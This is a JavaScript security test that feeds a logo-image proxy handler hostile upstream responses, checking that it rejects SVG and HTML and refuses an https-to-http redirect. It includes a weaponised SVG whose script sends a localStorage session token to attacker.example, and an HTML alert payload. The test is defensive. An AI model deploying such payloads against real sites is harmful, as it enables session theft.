// Drives the REAL exported handler in functions/lxapi/logoimg.js against a hostile upstream.
//
// Nothing here re-implements the check being tested: fetch and KV are stubbed so the attacker's URL
// and the attacker's bytes reach the real code, and only the handler's own Response is inspected.
import fs from 'node:fs';
import { onRequestGet } from 'file:///C:/LumosCore/functions/lxapi/logoimg.js';

const ASSET = 'EVIL-GACMOLVJSPD6U2LJXAMA5N5BDOXO7JZTEFMZBMQSGR7TZIIOVBLJENQI';
const read = (p) => fs.readFileSync(p);

const REAL = {
  png:  read('C:/LumosCore/dist/assets/networks/arbitrum.png'),
  jpeg: read('C:/LumosCore/dist/assets/tokens/FED-GA7OS5RZAVW2Q4RQJTP5IR63CGSTQASIIYLF4JHPJEPZKIJJ6N7LDQ3X.jpg'),
  svg:  read('C:/LumosCore/dist/assets/tokens/blnd.svg'),
};
// A weaponised SVG of exactly the kind an issuer can put in their own toml.
const EVIL_SVG = Buffer.from(
  '<svg xmlns="http://www.w3.org/2000/svg" width="64" height="64">' +
  '<script>fetch("https://attacker.example/?s="+encodeURIComponent(localStorage.getItem("lx.session")||""))</script>' +
  '<rect width="64" height="64" fill="#000"/></svg>');
const EVIL_HTML = Buffer.from('<!doctype html><html><script>alert(document.domain)</script></html>');

// Each case: what the issuer's server sends back.
const CASES = [
  ['real PNG',                          'image/png',      REAL.png,   200, 'image/png'],
  ['real JPEG',                         'image/jpeg',     REAL.jpeg,  200, 'image/jpeg'],
  ['real SVG, honestly labelled',       'image/svg+xml',  REAL.svg,   415, null],
  ['SCRIPTED SVG, honestly labelled',   'image/svg+xml',  EVIL_SVG,   415, null],
  ['SCRIPTED SVG, labelled image/png',  'image/png',      EVIL_SVG,   415, null],
  ['HTML labelled image/png',           'image/png',      EVIL_HTML,  415, null],
  ['HTML labelled text/html',           'text/html',      EVIL_HTML,  415, null],
  ['PNG with a charset parameter',      'image/png; charset=utf-8', REAL.png, 200, 'image/png'],
  ['PNG bytes labelled image/jpeg',     'image/jpeg',     REAL.png,   200, 'image/png'], // we emit the truth
  ['empty body labelled image/png',     'image/png',      Buffer.alloc(0), 415, null],
];

let pass = 0, fail = 0;
for (const [name, ctype, body, wantStatus, wantType] of CASES) {
  globalThis.fetch = async (u) => new Response(body, {
    status: 200, headers: { 'content-type': ctype },
  });
  // the handler reads up.url; Response.url is '' in node, and the handler falls back to src, which is
  // the https override below.
  const env = { CONTENT_KV: { get: async () => ({ image: 'https://issuer.example/logo' }) } };
  const res = await onRequestGet({
    request: new Request('https://lumoscore.com/lxapi/logoimg?asset=' + ASSET), env,
  });
  const got = res.headers.get('content-type');
  const ok = res.status === wantStatus && (wantType === null || got === wantType);
  if (ok) pass++; else fail++;
  console.log((ok ? '  PASS  ' : '  FAIL  ') + name.padEnd(34)
    + ' -> ' + res.status + (got ? ' ' + got : '')
    + (ok ? '' : '   EXPECTED ' + wantStatus + ' ' + (wantType || '')));
  if (res.status === 200) {
    const csp = res.headers.get('content-security-policy'), ns = res.headers.get('x-content-type-options');
    if (ns !== 'nosniff' || !csp) { console.log('        ! missing hardening headers'); fail++; }
  }
}

// The redirect escape: an https URL that lands on http.
globalThis.fetch = async () => {
  const r = new Response(REAL.png, { status: 200, headers: { 'content-type': 'image/png' } });
  Object.defineProperty(r, 'url', { value: 'http://issuer.example/logo' });
  return r;
};
const r2 = await onRequestGet({
  request: new Request('https://lumoscore.com/lxapi/logoimg?asset=' + ASSET),
  env: { CONTENT_KV: { get: async () => ({ image: 'https://issuer.example/logo' }) } },
});
const okR = r2.status === 415;
if (okR) pass++; else fail++;
console.log((okR ? '  PASS  ' : '  FAIL  ') + 'https redirected to http'.padEnd(34) + ' -> ' + r2.status);

console.log('\n' + pass + ' passed, ' + fail + ' failed');
process.exit(fail ? 1 : 0);
